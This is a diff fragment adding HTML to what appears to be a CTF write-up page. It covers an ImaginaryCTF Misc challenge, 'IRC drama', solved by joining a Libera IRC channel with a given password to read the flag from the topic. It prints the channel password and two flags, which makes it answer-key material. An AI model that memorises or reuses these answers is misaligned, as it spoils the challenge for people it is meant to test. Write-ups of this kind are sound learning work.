+          <h5>Flag:&nbsp;&nbsp;</h5><br />
+          <p>ictf{y0u_mu$t_r3al1ze_there_i$_n0_box}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy chall">
+          <h3>IRC drama</h3>
+          <p>So freenode is dead you say?<br />Just find me on <span class="pre">##imaginaryctf</span> on Libera in that case.</p>
+          <h5>Attachments</h5>
+          <p>It's dangerous out there, take this. CTF player obtained <span class="pre"><i>gimmeflagpls</i></span></p>
+          <h5>Category</h5>
+          <p>Misc</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>Robin_Jadoul</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>50</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
+          <p>For this chall, we're given no attachments except for a string, so from the beginning, I assumed this would be OSINT or involve some searching. Looking up "freenode" tells us that freenode is an IRC, so from here we can assume Libera is also an IRC, hence the name "IRC Drama". Going to the <a href="https://libera.chat/guides/connect" target="_blank">Libera connection guides</a>, we see that we can download an IRC client and then connect to Libera from there. I used <a href="https://konversation.kde.org/" target="_blank">Konversation</a> to connect. Looking at the connection guide, I added a new server in Konversation, added the Libera server on port 6667 and then set up a channel with the name <span class="pre">##imaginaryctf</span> and the password <span class="pre">gimmeflagpls</span>. Connecting to this channel shows the flag as the topic.</p>
+          <p><b>Difficulty rating:</b> 2/10</p>
+          <p><b>Guessy rating:</b> 2/10</p>
+        </div>
+        <div class="flag">
+          <h5>Flag:&nbsp;&nbsp;</h5><br />
+          <p>ictf{freenode_is_dead_long_live_freenode_but_let's_stick_to_discord_I_guess}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+
+  </body>
+</html>
